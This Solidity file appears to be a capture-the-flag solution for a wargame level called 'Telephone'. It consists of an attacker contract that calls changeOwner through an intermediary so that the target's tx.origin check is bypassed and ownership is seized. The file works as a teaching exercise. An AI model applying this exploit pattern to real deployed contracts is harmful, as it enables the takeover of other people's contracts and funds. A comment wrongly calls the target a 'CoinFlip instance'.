// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 4. TELEPHONE
 * @dev Claim ownership of the contract below to complete this level.
 */

interface ITelephone {
    function changeOwner(address _owner) external;
}

// Simply use a contract to call the changeOwner function and bypass the tx.origin check
contract OneMissedCall {
    address constant telephoneContract =
        0x78511757104F75fE89E6F291cB86f553ff3b4207; // Replace with your CoinFlip instance

    function attack() public {
        ITelephone(telephoneContract).changeOwner(msg.sender);
    }
}

// 🎉 Level completed! 🎉
